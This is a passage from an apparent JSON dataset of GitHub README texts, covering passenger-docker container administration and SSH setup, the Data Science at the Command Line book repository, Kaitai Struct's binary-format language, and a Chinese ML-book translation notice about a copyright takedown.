version\n\nYou can run any command with a specific Ruby version by prefixing it with `rvm-exec <IDENTIFIER>`. For example:\n\n```bash\n$ rvm-exec 2.5.7 ruby -v\nruby 2.5.7\n$ rvm-exec 2.4.9 ruby -v\nruby 2.4.9\n```\n\nMore examples, but with Bundler instead:\n\n```bash\n# This runs 'bundle install' using Ruby 2.5.7\nrvm-exec 2.5.7 bundle install\n\n# This runs 'bundle install' using Ruby 2.4.9\nrvm-exec 2.4.9 bundle install\n```\n\n<a name=\"default_ruby_wrapper_scripts\"><\/a>\n#### Default wrapper scripts\n\nRubies are installed by RVM to \/usr\/local\/rvm. Interactive and login Bash shells load the RVM environment, which ensures that the appropriate directories under \/usr\/local\/rvm are in PATH.\n\nBut this means that if you invoke a command without going through an interactive and login Bash shell (e.g. directly using `docker exec`) then the RVM environment won't be loaded. In order to make Ruby work even in this case, Passenger-docker includes a bunch of wrapper scripts:\n\n * \/usr\/bin\/ruby\n * \/usr\/bin\/rake\n * \/usr\/bin\/gem\n * \/usr\/bin\/bundle\n\nThese wrapper scripts execute the respective command through `rvm-exec` using the default Ruby interpreter.\n\n<a name=\"running_startup_scripts\"><\/a>\n### Running scripts during container startup\n\npassenger-docker uses the [baseimage-docker](http:\/\/phusion.github.io\/baseimage-docker\/) init system, `\/sbin\/my_init`. This init system runs the following scripts during startup, in the following order:\n\n * All executable scripts in `\/etc\/my_init.d`, if this directory exists. The scripts are run during in lexicographic order.\n * The script `\/etc\/rc.local`, if this file exists.\n\nAll scripts must exit correctly, e.g. with exit code 0. If any script exits with a non-zero exit code, the booting will fail.\n\nThe following example shows how you can add a startup script. This script simply logs the time of boot to the file \/tmp\/boottime.txt.\n\n    ### In logtime.sh (make sure this file is chmod +x):\n    #!\/bin\/sh\n    date > \/tmp\/boottime.txt\n\n    ### In Dockerfile:\n    RUN mkdir -p \/etc\/my_init.d\n    ADD logtime.sh \/etc\/my_init.d\/logtime.sh\n\n<a name=\"upgrading_os\"><\/a>\n### Upgrading the operating system inside the container\n\npassenger-docker images contain an Ubuntu 16.04 operating system. You may want to update this OS from time to time, for example to pull in the latest security updates. OpenSSL is a notorious example. Vulnerabilities are discovered in OpenSSL on a regular basis, so you should keep OpenSSL up-to-date as much as you can.\n\nWhile we release passenger-docker images with the latest OS updates from time to time, you do not have to rely on us. You can update the OS inside passenger-docker images yourself, and it is recommend that you do this instead of waiting for us.\n\nTo upgrade the OS in the image, run this in your Dockerfile:\n\n    RUN apt-get update && apt-get upgrade -y -o Dpkg::Options::=\"--force-confold\"\n\n<a name=\"upgrading_passenger\"><\/a>\n### Upgrading Passenger to the latest version\n\n#### Upgrading to the latest image\n\nPassenger-docker images contain a specific Passenger version by default. We regularly update passenger-docker with the latest version of Passenger, Ruby, Node.js, etc.\n\nTo upgrade your image to the latest passenger-docker version, please edit your Dockerfile and change the passenger-docker version in the `FROM` command to the latest version. You can find a list of available versions in the [Changelog](https:\/\/github.com\/phusion\/passenger-docker\/blob\/master\/CHANGELOG.md).\n\nFor example, if you were using passenger-docker 0.9.16 and want to upgrade to 0.9.17, then change...\n\n```dockerfile\nFROM phusion\/passenger-docker-XXXX:0.9.16\n```\n\n...to:\n\n```dockerfile\nFROM phusion\/passenger-docker-XXXX:0.9.17\n```\n\nThen rebuild your image.\n\n#### Upgrading Passenger without waiting for image updates\n\nWe do not update the passenger-docker image on *every* Passenger release. Having said that, you can upgrade Passenger at any time, without waiting for us to release a new image.\n\nPassenger is installed through [the Passenger APT repository](https:\/\/www.phusionpassenger.com\/library\/install\/nginx\/apt_repo\/), so you can use APT to upgrade Passenger.\n\nTo upgrade to the latest Passenger version, run this to your Dockerfile:\n\n```dockerfile\nRUN apt-get update && apt-get upgrade -y -o Dpkg::Options::=\"--force-confold\"\n```\n\n<a name=\"container_administration\"><\/a>\n## Container administration\n\nOne of the ideas behind Docker is that containers should be stateless, easily restartable, and behave like a black box. However, you may occasionally encounter situations where you want to login to a container, or to run a command inside a container, for development, inspection and debugging purposes. This section describes how you can administer the container for those purposes.\n\n_**Tip**: passenger-docker is based on [baseimage-docker](https:\/\/github.com\/phusion\/baseimage-docker). Please consult [the baseimage-docker documentation](https:\/\/github.com\/phusion\/baseimage-docker) for more container administration documentation and tips._\n\n<a name=\"oneshot\"><\/a>\n### Running a one-shot command in a new container\n\n_**Note:** This section describes how to run a command insider a -new- container. To run a command inside an existing running container, see [Running a command in an existing, running container](#run_inside_existing_container)._\n\nNormally, when you want to create a new container in order to run a single command inside it, and immediately exit after the command exits, you invoke Docker like this:\n\n    docker run YOUR_IMAGE COMMAND ARGUMENTS...\n\nHowever the downside of this approach is that the init system is not started. That is, while invoking `COMMAND`, important daemons such as cron and syslog are not running. Also, orphaned child processes are not properly reaped, because `COMMAND` is PID 1.\n\nPassenger-docker provides a facility to run a single one-shot command, while solving all of the aforementioned problems. Run a single command in the following manner:\n\n    docker run YOUR_IMAGE \/sbin\/my_init -- COMMAND ARGUMENTS ...\n\nThis will perform the following:\n\n * Runs all system startup files, such as \/etc\/my_init.d\/* and \/etc\/rc.local.\n * Starts all runit services.\n * Runs the specified command.\n * When the specified command exits, stops all runit services.\n\nFor example:\n\n    $ docker run phusion\/passenger-full:<VERSION> \/sbin\/my_init -- ls\n    *** Running \/etc\/rc.local...\n    *** Booting runit daemon...\n    *** Runit started as PID 80\n    *** Running ls...\n    bin  boot  dev  etc  home  image  lib  lib64  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var\n    *** ls exited with exit code 0.\n    *** Shutting down runit daemon (PID 80)...\n    *** Killing all processes...\n\nYou may find that the default invocation is too noisy. Or perhaps you don't want to run the startup files. You can customize all this by passing arguments to `my_init`. Invoke `docker run YOUR_IMAGE \/sbin\/my_init --help` for more information.\n\nThe following example runs `ls` without running the startup files and with less messages, while running all runit services:\n\n    $ docker run phusion\/passenger-full:<VERSION> \/sbin\/my_init --skip-startup-files --quiet -- ls\n    bin  boot  dev  etc  home  image  lib  lib64  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var\n\n<a name=\"run_inside_existing_container\"><\/a>\n### Running a command in an existing, running container\n\nThere are two ways to run a command inside an existing, running container.\n\n * Through the `docker exec` tool. This is builtin Docker tool, available since Docker 1.4. Internally, it uses Linux kernel system calls in order to execute a command within the context of a container. Learn more in [Login to the container, or running a command inside it, via `docker exec`](#login_docker_exec).\n * Through SSH. This approach requires running an SSH daemon inside the container, and requires you to setup SSH keys. Learn more in [Login to the container, or running a command inside it, via SSH](#login_ssh).\n\nBoth way have their own pros and cons, which you can learn in their respective subsections.\n\n<a name=\"login_docker_exec\"><\/a>\n### Login to the container, or running a command inside it, via `docker exec`\n\nYou can use the `docker exec` tool on the Docker host OS to login to any container that is based on passenger-docker. You can also use it to run a command inside a running container. `docker exec` works by using Linux kernel system calls.\n\nHere's how it compares to [using SSH to login to the container or to run a command inside it](#login_ssh):\n\n * Pros\n   * Does not require running an SSH daemon inside the container.\n   * Does not require setting up SSH keys.\n   * Works on any container, even containers not based on passenger-docker.\n * Cons\n   * If the `docker exec` process on the host is terminated by a signal (e.g. with the `kill` command or even with Ctrl-C), then the command that is executed by `docker exec` is *not* killed and cleaned up. You will either have to do that manually, or you have to run `docker exec` with `-t -i`.\n   * Requires privileges on the Docker host to be able to access the Docker daemon. Note that anybody who can access the Docker daemon effectively has root access.\n   * Not possible to allow users to login to the container without also letting them login to the Docker host.\n\n<a name=\"docker_exec_usage\"><\/a>\n#### Usage\n\nStart a container:\n\n    docker run YOUR_IMAGE\n\nFind out the ID of the container that you just ran:\n\n    docker ps\n\nNow that you have the ID, you can use `docker exec` to run arbitrary commands in the container. For example, to run `echo hello world`:\n\n    docker exec YOUR-CONTAINER-ID echo hello world\n\nTo open a bash session inside the container, you must pass `-t -i` so that a terminal is available:\n\n    docker exec -t -i YOUR-CONTAINER-ID bash -l\n\n<a name=\"login_ssh\"><\/a>\n### Login to the container, or running a command inside it, via SSH\n\nYou can use SSH to login to any container that is based on passenger-docker. You can also use it to run a command inside a running container.\n\nHere's how it compares to [using `docker exec` to login to the container or to run a command inside it](#login_docker_exec):\n\n * Pros\n   * Does not require root privileges on the Docker host.\n   * Allows you to let users login to the container, without letting them login to the Docker host. However, this is not enabled by default because passenger-docker does not expose the SSH server to the public Internet by default.\n * Cons\n   * Requires setting up SSH keys. However, passenger-docker makes this easy for many cases through a pregenerated, insecure key. Read on to learn more.\n\n<a name=\"enabling_ssh\"><\/a>\n#### Enabling SSH\n\nPassenger-docker disables the SSH server by default. Add the following to your Dockerfile to enable it:\n\n```dockerfile\nRUN rm -f \/etc\/service\/sshd\/down\n\n# Regenerate SSH host keys. Passenger-docker does not contain any, so you\n# have to do that yourself. You may also comment out this instruction; the\n# init system will auto-generate one during boot.\nRUN \/etc\/my_init.d\/00_regen_ssh_host_keys.sh\n```\n\n<a name=\"ssh_keys\"><\/a>\n#### About SSH keys\n\nFirst, you must ensure that you have the right SSH keys installed inside the container. By default, no keys are installed, so nobody can login. For convenience reasons, we provide [a pregenerated, insecure key](https:\/\/raw.githubusercontent.com\/phusion\/baseimage-docker\/master\/image\/services\/sshd\/keys\/insecure_key) [(PuTTY format)](https:\/\/raw.githubusercontent.com\/phusion\/baseimage-docker\/master\/image\/services\/sshd\/keys\/insecure_key.ppk) that you can easily enable. However, please be aware that using this key is for convenience only. It does not provide any security because this key (both the public and the private side) is publicly available. **In production environments, you should use your own keys**.\n\n<a name=\"using_the_insecure_key_for_one_container_only\"><\/a>\n#### Using the insecure key for one container only\n\nYou can temporarily enable the insecure key for one container only. This means that the insecure key is installed at container boot. If you `docker stop` and `docker start` the container, the insecure key will still be there, but if you use `docker run` to start a new container then that container will not contain the insecure key.\n\nStart a container with `--enable-insecure-key`:\n\n    docker run YOUR_IMAGE \/sbin\/my_init --enable-insecure-key\n\nFind out the ID of the container that you just ran:\n\n    docker ps\n\nOnce you have the ID, look for its IP address with:\n\n    docker inspect -f \"{{ .NetworkSettings.IPAddress }}\" <ID>\n\nNow that you have the IP address, you can use SSH to login to the container, or to execute a command inside it:\n\n```bash\n# Download the insecure private key\ncurl -o insecure_key -fSL https:\/\/raw.githubusercontent.com\/phusion\/baseimage-docker\/master\/image\/services\/sshd\/keys\/insecure_key\nchmod 600 insecure_key\n\n# Login to the container\nssh -i insecure_key root@<IP address>\n\n# Running a command inside the container\nssh -i insecure_key root@<IP address> echo hello world\n```\n\n<a name=\"enabling_the_insecure_key_permanently\"><\/a>\n#### Enabling the insecure key permanently\n\nIt is also possible to enable the insecure key in the image permanently. This is not generally recommended, but is suitable for e.g. temporary development or demo environments where security does not matter.\n\nEdit your Dockerfile to install the insecure key permanently:\n\n```dockerfile\nRUN \/usr\/sbin\/enable_insecure_key\n```\n\nInstructions for logging in the container is the same as in section [Using the insecure key for one container only](#using_the_insecure_key_for_one_container_only).\n\n<a name=\"using_your_own_key\"><\/a>\n#### Using your own key\n\nEdit your Dockerfile to install an SSH public key:\n\n```dockerfile\n## Install an SSH of your choice.\nADD your_key.pub \/tmp\/your_key.pub\nRUN cat \/tmp\/your_key.pub >> \/root\/.ssh\/authorized_keys && rm -f \/tmp\/your_key.pub\n```\n\nThen rebuild your image. Once you have that, start a container based on that image:\n\n    docker run your-image-name\n\nFind out the ID of the container that you just ran:\n\n    docker ps\n\nOnce you have the ID, look for its IP address with:\n\n    docker inspect -f \"{{ .NetworkSettings.IPAddress }}\" <ID>\n\nNow that you have the IP address, you can use SSH to login to the container, or to execute a command inside it:\n\n```bash\n# Login to the container\nssh -i \/path-to\/your_key root@<IP address>\n\n# Running a command inside the container\nssh -i \/path-to\/your_key root@<IP address> echo hello world\n```\n\n<a name=\"docker_ssh\"><\/a>\n#### The `docker-ssh` tool\n\nLooking up the IP of a container and running an SSH command quickly becomes tedious. Luckily, we provide the `docker-ssh` tool which automates this process. This tool is to be run on the *Docker host*, not inside a Docker container.\n\nFirst, install the tool on the Docker host:\n\n```bash\ncurl --fail -L -O https:\/\/github.com\/phusion\/baseimage-docker\/archive\/master.tar.gz && \\\ntar xzf master.tar.gz && \\\nsudo .\/baseimage-docker-master\/install-tools.sh\n```\n\nThen run the tool as follows to login to a container using SSH:\n\n    docker-ssh YOUR-CONTAINER-ID\n\nYou can lookup `YOUR-CONTAINER-ID` by running `docker ps`.\n\nBy default, `docker-ssh` will open a Bash session. You can also tell it to run a command, and then exit:\n\n    docker-ssh YOUR-CONTAINER-ID echo hello world\n\n<a name=\"inspecting_web_app_status\"><\/a>\n### Inspecting the status of your web app\n\nIf you use Passenger to deploy your web app, run:\n\n    passenger-status\n    passenger-memory-stats\n\n<a name=\"logs\"><\/a>\n### Logs\n\nIf anything goes wrong, consult the log files in \/var\/log. The following log files are especially important:\n\n * \/var\/log\/nginx\/error.log\n * \/var\/log\/syslog\n * Your app's log file in \/home\/app.\n\n<a name=\"enterprise\"><\/a>\n### Switching to Phusion Passenger Enterprise\n\nIf you are a [Phusion Passenger Enterprise](https:\/\/www.phusionpassenger.com\/enterprise) customer, then you can switch to the Enterprise variant as follows.\n\n 1. Login to the [Customer Area](https:\/\/www.phusionpassenger.com\/orders).\n 2. Download the license key and store it in the same directory as your Dockerfile.\n 3. Insert into your Dockerfile:\n\n```dockerfile\nADD passenger-enterprise-license \/etc\/passenger-enterprise-license\nRUN echo deb https:\/\/download:$DOWNLOAD_TOKEN@www.phusionpassenger.com\/enterprise_apt bionic main > \/etc\/apt\/sources.list.d\/passenger.list\nRUN apt-get update && apt-get install -y -o Dpkg::Options::=\"--force-confold\" passenger-enterprise nginx-extras\n```\n\n    Replace `$DOWNLOAD_TOKEN` with your actual download token, as found in the Customer Area.\n\n<a name=\"building\"><\/a>\n## Building the image yourself\n\nIf for whatever reason you want to build the image yourself instead of downloading it from the Docker registry, follow these instructions.\n\nClone this repository:\n\n    git clone https:\/\/github.com\/phusion\/passenger-docker.git\n    cd passenger-docker\n\nStart a virtual machine with Docker in it. You can use the Vagrantfile that we've already provided.\n\n    vagrant up\n    vagrant ssh\n    cd \/vagrant\n\nBuild one of the images:\n\n    make build_ruby23\n    make build_ruby24\n    make build_ruby25\n    make build_ruby26\n    make build_jruby92\n    make build_nodejs\n    make build_customizable\n    make build_full\n\nIf you want to call the resulting image something else, pass the NAME variable, like this:\n\n    make build NAME=joe\/passenger\n\n<a name=\"faq\"><\/a>\n## FAQ\n\n<a name=\"why_rvm\"><\/a>\n#### Why are you using RVM? Why not rbenv or chruby?\n\nIn summary:\n\n * We have found RVM to be much more user friendly than rbenv and chruby.\n * RVM supplies precompiled binaries, while rbenv and chruby only support compiling Ruby from source.\n * Installing Ruby from Brightbox's APT repository caused too many problems. We used Brightbox's APT repository in the past, but we concluded that it is not the way to go forward.\n\nRbenv and chruby's main value proposition is that they are \"simple\". Indeed, they are simpler in implementation (fewer lines of code) than RVM, but they are not simpler to use. Rbenv and chruby are built on the Unix \"do one thing only\" philosophy. While this is sound, it is not necessarily the behavior that users want: I have seen many users struggling with basic rbenv\/chruby usage because of lack of understanding of environment variables, or not having installed the right dependencies. Many users do not understand how the system is supposed to function and what all the different parts are, so doing one thing only may not be what they need. In such a case the simplicity ends up being more of a liability than an asset. It's like selling a car engine, frame and interior separately, while most consumers want an entire car.\n\nRVM is built around a more \"holistic\" philosophy, if you will. It tries harder to be friendly to users who may not necessarily understand how everything works, for example by automatically installing a bash profile entry, by automatically installing necessary dependencies.\n\nAnother critique of RVM is that it is complicated and causes problems. This has not been our experience: perhaps this was the case in the past, but we have found RVM to be quite stable.\n\n#### Why don't you just install Ruby manually from source?\n\nBy installing Ruby manually from source, we are just reinventing some of the functionality provided by a real Ruby version manager such as RVM, so we may as well use one to save ourselves time. There is no reason not to use RVM: it only occupies 5 MB of space.\n\n#### Why are you not using the Brightbox's APT repository?\n\nThe Brightbox APT repository contains packages for multiple Ruby versions, which can be installed side-by-side. At first, this seems like the perfect solution. And indeed, passenger-docker used to use the Brightbox APT repository.\n\nUnfortunately, we have found that it is much harder to make the different Rubies play nice with each other than it should be. Despite being installable side-to-side, they still conflict with each other. The most notable problem is that all Rubies' RubyGems install binwrappers to \/usr\/local\/bin, but binwrappers generated by different Ruby versions may not be compatible with each other.\n\nRVM provides much better isolation between different Ruby versions.\n\n#### Why don't you just install Ruby from Ubuntu's APT repository?\n\nBecause we need to support Ruby versions not available from Ubuntu's APT repository. Besides, Ubuntu (and Debian) are notorious for being slow with updating Ruby packages. By the time the next Ruby version is released, we will have to wait until the next Ubuntu LTS version before we can use it.\n\n<a name=\"contributing\"><\/a>\n## Contributing\n\nThanks for your interest in contributing! There are many ways to contribute to this project. Get started [here](https:\/\/github.com\/phusion\/passenger-docker\/blob\/master\/CONTRIBUTING.md).\n\n<a name=\"conclusion\"><\/a>\n## Conclusion\n\n * Using passenger-docker? [Tweet about us](https:\/\/twitter.com\/share) or [follow us on Twitter](https:\/\/twitter.com\/phusion_nl).\n * Having problems? Please post a message at [the discussion forum](https:\/\/groups.google.com\/d\/forum\/passenger-docker).\n * Looking for a minimal image containing only a correct base system? Take a look at [baseimage-docker](https:\/\/github.com\/phusion\/baseimage-docker).\n * Need a helping hand? Phusion also offers [consulting](https:\/\/www.phusion.nl\/consultancy) on a wide range of topics, including Web Development, UI\/UX Research & Design, Technology Migration and Auditing.\n\n\n[<img src=\"https:\/\/www.phusion.nl\/images\/mark_logotype.svg\">](http:\/\/www.phusion.nl\/)\n\nPlease enjoy passenger-docker, a product by [Phusion](http:\/\/www.phusion.nl\/). :-)\n"},{"repo":"\/jeroenjanssens\/data-science-at-the-command-line","language":"HTML","readme_contents":"Data Science at the Command Line\n================================\n\n[![Build Status](https:\/\/travis-ci.org\/jeroenjanssens\/data-science-at-the-command-line.svg?branch=master)](https:\/\/travis-ci.org\/jeroenjanssens\/data-science-at-the-command-line)\n[![License: CC BY-ND 4.0](https:\/\/img.shields.io\/badge\/License-CC%20BY--ND%204.0-lightgrey.svg)](https:\/\/creativecommons.org\/licenses\/by-nd\/4.0\/)\n[![License](https:\/\/img.shields.io\/badge\/License-BSD%202--Clause-orange.svg)](https:\/\/opensource.org\/licenses\/BSD-2-Clause)\n\n<img src=\"http:\/\/datascienceatthecommandline.com\/images\/cover.png\" width=\"349px\" style=\"border: 1px solid black;\" \/>\n\nThis repository contains the full text, data, scripts, and custom command-line tools used in the book [Data Science at the Command Line](http:\/\/datascienceatthecommandline.com). The book is licensed under the Creative Commons Attribution-NoDerivatives 4.0 International License. The command-line tools are licensed under the BSD 2-Clause License.\n"},{"repo":"\/kaitai-io\/kaitai_struct","language":"Shell","readme_contents":"# Kaitai Struct\n\n[![Join the chat at https:\/\/gitter.im\/kaitai_struct\/Lobby](https:\/\/badges.gitter.im\/kaitai_struct\/Lobby.svg)](https:\/\/gitter.im\/kaitai_struct\/Lobby?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n## What is Kaitai Struct?\n\nKaitai Struct is a declarative language used for describing various\nbinary data structures laid out in files or in memory: i.e. binary\nfile formats, network stream packet formats, etc.\n\nThe main idea is that a particular format is described in Kaitai\nStruct language only once and then can be compiled with a `ksc` into\nsource files in one of the supported programming languages. These\nmodules will include a generated code for a parser that can read\ndescribed data structure from a file \/ stream and give access to it in\na nice, easy-to-comprehend API.\n\n## What it's used for?\n\nHave you ever found yourself writing repetitive, error-prone and\nhard-to-debug code that reads binary data structures from file \/\nnetwork stream and somehow represents them in memory for easier\naccess?\n\nKaitai Struct tries to make this job easier \u2014 you only have to\ndescribe the binary format once and then everybody can use it from their\nprogramming languages \u2014 cross-language, cross-platform.\n\nKaitai Struct includes a growing collection of format descriptions,\navailable in\n[formats](https:\/\/github.com\/kaitai-io\/kaitai_struct_formats)\nsubmodule repository.\n\n## Can you give me a quick example?\n\nSure. Consider this simple `.ksy` format description file that\ndescribes the header of a GIF file (a popular web image format):\n\n```yaml\nmeta:\n  id: gif\n  file-extension: gif\n  endian: le\nseq:\n  - id: header\n    type: header\n  - id: logical_screen\n    type: logical_screen\ntypes:\n  header:\n    seq:\n      - id: magic\n        contents: 'GIF'\n      - id: version\n        size: 3\n  logical_screen:\n    seq:\n      - id: image_width\n        type: u2\n      - id: image_height\n        type: u2\n      - id: flags\n        type: u1\n      - id: bg_color_index\n        type: u1\n      - id: pixel_aspect_ratio\n        type: u1\n```\n\nIt declares that GIF files usually have a `.gif` extension and use\nlittle-endian integer encoding. The file itself starts with two\nblocks: first comes `header` and then comes `logical_screen`:\n\n* \"Header\" consists of \"magic\" string of 3 bytes (\"GIF\") that\n  identifies that it's a GIF file starting and then there are 3 more\n  bytes that identify format version (`87a` or `89a`).\n* \"Logical screen descriptor\" is a block of integers:\n  * `image_width` and `image_height` are 2-byte unsigned ints\n  * `flags`, `bg_color_index` and `pixel_aspect_ratio` take 1-byte\n    unsigned int each\n\nThis `.ksy` file can be compiled it into `Gif.cs` \/ `Gif.java` \/\n`Gif.js` \/ `gif.py` \/ `gif.rb` and then instantly one can load .gif\nfile and access, for example, it's width and height.\n\n### In C\\# \n\n```cs\nGif g = Gif.FromFile(\"path\/to\/some.gif\");\nConsole.WriteLine(\"width = \" + g.LogicalScreen.ImageWidth);\nConsole.WriteLine(\"height = \" + g.LogicalScreen.ImageHeight);\n```\n\n### In Java\n\n```java\nGif g = Gif.fromFile(\"path\/to\/some.gif\");\nSystem.out.println(\"width = \" + g.logicalScreen().imageWidth());\nSystem.out.println(\"height = \" + g.logicalScreen().imageHeight());\n```\n\n### In JavaScript\n\nSee [JavaScript notes in the documentation](http:\/\/doc.kaitai.io\/lang_javascript.html) for a more complete quick start guide.\n\n```javascript\nvar g = new Gif(new KaitaiStream(someArrayBuffer));\nconsole.log(\"width = \" + g.logicalScreen().imageWidth());\nconsole.log(\"height = \" + g.logicalScreen().imageHeight());\n```\n\n### In Lua\n\n```lua\nlocal g = Gif:from_file(\"path\/to\/some.gif\")\nprint(\"width = \" .. g.logical_screen.image_width)\nprint(\"height = \" .. g.logical_screen.image_height)\n```\n\n### In Python\n\n```python\ng = Gif.from_file(\"path\/to\/some.gif\")\nprint \"width = %d\" % (g.logical_screen.image_width)\nprint \"height = %d\" % (g.logical_screen.image_height)\n```\n\n### In Ruby\n\n```ruby\ng = Gif.from_file(\"path\/to\/some.gif\")\nputs \"width = #{g.logical_screen.image_width}\"\nputs \"height = #{g.logical_screen.image_height}\"\n```\n\nOf course, this example shows only a very limited subset of what Kaitai\nStruct can do. Please refer to the tutorials and documentation for\nmore insights.\n\n## Supported languages\n\nOfficial Kaitai Struct [compiler] now supports compiling `.ksy` into\nsource modules for the following languages:\n\n* C#\n* Java\n* JavaScript\n* Lua\n* Python\n* Ruby\n\n## Downloading and installing\n\nThe easiest way to check out the whole Kaitai Struct project is to\ndownload the main project repository that already imports all other parts\nas sub-modules. Use:\n\n    git clone --recursive https:\/\/github.com\/kaitai-io\/kaitai_struct.git\n\nNote the `--recursive` option.\n\nAlternatively, one can check out individual sub-projects that\nconsitute Kaitai Struct suite. They are:\n\n* [kaitai_struct_compiler](https:\/\/github.com\/kaitai-io\/kaitai_struct_compiler) \u2014 compiler that translates `.ksy` into a parser source code written in a target programming language\n* [kaitai_struct_tests](https:\/\/github.com\/kaitai-io\/kaitai_struct_tests) \u2014 tests & specs to ensure that compiler work as planned\n* Runtime libraries\n  * [kaitai_struct_cpp_stl_runtime](https:\/\/github.com\/kaitai-io\/kaitai_struct_cpp_stl_runtime) \u2014 for C++\/STL\n  * [kaitai_struct_csharp_runtime](https:\/\/github.com\/kaitai-io\/kaitai_struct_csharp_runtime) \u2014 for C#\n  * [kaitai_struct_java_runtime](https:\/\/github.com\/kaitai-io\/kaitai_struct_java_runtime) \u2014 for Java\n  * [kaitai_struct_javascript_runtime](https:\/\/github.com\/kaitai-io\/kaitai_struct_javascript_runtime) \u2014 for JavaScript\n  * [kaitai_struct_lua_runtime](https:\/\/github.com\/kaitai-io\/kaitai_struct_lua_runtime) \u2014 for Lua\n  * [kaitai_struct_python_runtime](https:\/\/github.com\/kaitai-io\/kaitai_struct_python_runtime) \u2014 for Python\n  * [kaitai_struct_ruby_runtime](https:\/\/github.com\/kaitai-io\/kaitai_struct_ruby_runtime) \u2014 for Ruby\n  * [kaitai_struct_swift_runtime](https:\/\/github.com\/kaitai-io\/kaitai_struct_swift_runtime) \u2014 for Swift\n* [kaitai_struct_formats](https:\/\/github.com\/kaitai-io\/kaitai_struct_formats)\n  \u2014 library of widely used formats and binary structures described as\n  `.ksy` files\n\n## Using KS in your project\n\nTypically, using formats described in KS in your project, involves the\nfollowing steps:\n\n* Describe the format \u2014 i.e. create a `.ksy` file\n* Compile `.ksy` file into target language source file and include\n  that file in your project\n* Add KS runtime library for your particular language into your\n  project (don't worry, it's small and it's there mostly to ensure\n  readability of generated code)\n* Use generated class(es) to parse your binary file \/ stream and\n  access its components\n\nCheck out the tutorial and documentation for more information.\n\n## Licensing\n\n* [Compiler] \u2014 GPLv3+\n* Runtime libraries \u2014 MIT or Apache v2 (=> you can include generated\n  code even into proprietary applications) \u2014 see individual libraries\n  for details\n\n[compiler]: https:\/\/github.com\/kaitai-io\/kaitai_struct_compiler\n"},{"repo":"\/apachecn\/hands-on-ml-zh","language":"CSS","readme_contents":"# Sklearn \u4e0e TensorFlow \u673a\u5668\u5b66\u4e60\u5b9e\u7528\u6307\u5357\n\n> Special Sponsors\n\n<table>\n      <tbody>\n        <tr>\n          <td align=\"center\" valign=\"middle\">\n            <a href=\"https:\/\/coding.net\/?utm_source=ApacheCN&utm_medium=banner&utm_campaign=march2019\" target=\"_blank\">\n              <img width=\"1080\" src=\"http:\/\/data.apachecn.org\/img\/SpecialSponsors\/CodingNet.png\">\n            <\/a>\n          <\/td>\n      <\/tbody>\n<\/table>\n\n> \u6ce8\uff1a\u611f\u8c22\u5404\u4f4d\u8d21\u732e\u8005\u7684\u8d21\u732e\uff0c\u8be5\u9879\u76ee\u7684\u7f51\u7ad9\u5df2\u7ecf\u4e0b\u7ebf\uff0c\u9879\u76ee\u5185\u5bb9\u4e0d\u518d\u66f4\u65b0\uff01\n> \n> \u5bf9\u6b64\u6211\u4eec\u611f\u5230\u975e\u5e38\u62b1\u6b49\u3002\u4e3a\u4e86\u8865\u507f\u5927\u5bb6\uff0c\u6211\u4eec\u7279\u5730\u542f\u52a8\u4e86[ Machine Learning Mastery \u535a\u5ba2\u6587\u7ae0\u7ffb\u8bd1](https:\/\/github.com\/apachecn\/ml-mastery-zh)\u9879\u76ee\u3002\u611f\u8c22\u5927\u5bb6\u4e00\u5982\u65e2\u5f80\u7684\u652f\u6301\uff0c\u540c\u65f6\u4e5f\u5e0c\u671b\u5927\u5bb6\u80fd\u591f\u7ee7\u7eed\u4e3a\u6211\u4eec\u63d0\u51fa\u5efa\u8bae\uff0c\u6216\u53c2\u4e0e\u6539\u5584\u6211\u4eec\u7684\u9879\u76ee\u3002\n> \n> \u4e3a\u4e86\u7ed9\u8d21\u732e\u8005\u548c\u8bfb\u8005\u4e00\u4e2a\u4ea4\u4ee3\uff0c\u6211\u628a\u90ae\u4ef6\u5185\u5bb9\u7ed9\u5927\u5bb6\u5c55\u793a\uff0c\u9690\u79c1\u4fe1\u606f\u7528 xxx \u8868\u793a\n\n\u90ae\u4ef6\u5982\u4e0b\uff1a\n\n```\n\u4fb5\u6743\u58f0\u660e\u2014\u2014Sklearn \u4e0e TensorFlow \u673a\u5668\u5b66\u4e60\u5b9e\u7528\u6307\u5357\n\u534e\u7ae0 \u738bxxx \u4e8e 2019-04-11 14:52 \u53d1\u7ed9 \u7247\u523b\n\n\u60a8\u597d\uff01\n \n\u300aHands-On Machine Learning with Scikit-Learn and TensorFlow\u300b\u4e00\u4e66\u7684\u4e2d\u6587\u7ffb\u8bd1\u7248\u6211\u793e\u5df2\u4e8e2018\u5e748\u6708\u51fa\u7248\uff0c978-7-111-60302-3\u673a\u5668\u5b66\u4e60\u5b9e\u6218\uff1a\u57fa\u4e8eScikit-Learn\u548cTensorFlow\uff0c\u60a8\u5728https:\/\/hand2st.apachecn.org\u53d1\u5e03\u7684\u7ffb\u8bd1\u5185\u5bb9\u5df2\u6d89\u53ca\u4fb5\u6743\uff0c\u8fd8\u8bf7\u5c3d\u5feb\u5220\u9664\u3002\n \n\u800c\u4e14\uff0c\u6211\u4eec\u4e5f\u4e8e2018\u5e745\u6708\u4e0eO'Reilly\u7b7e\u7f72\u4e86\u8be5\u4e66\u7b2c2\u7248\u7684\u4e2d\u6587\u7b80\u4f53\u7248\u7248\u6743\uff0c\u5982\u679c\u4f60\u4eec\u60f3\u53c2\u4e0e\u672c\u4e66\u7b2c2\u7248\u7684\u7ffb\u8bd1\uff0c\u5230\u65f6\u6211\u4eec\u53ef\u4ee5\u8054\u7cfb\uff01\n\n\u795d\u597d\uff01\n\u738bxxx\n\n\u673a\u68b0xxx\u51fa\u7248\u793exxx\u516c\u53f8xxx\n\u8054\u7cfb\u65b9\u5f0f\uff1axxx\n\u5730\u5740\uff1axxx\n```\n\n\u56de\u590d\u5982\u4e0b\uff1a\n\n```\n\u3010\u5f53\u7136\u7b2c\u4e00\u6b65\u5c31\u662f\u4e0b\u7ebf\u7f51\u7ad9\uff01 \u5df2\u7ecf\u5904\u7406\u5b8c\u4e86\uff01 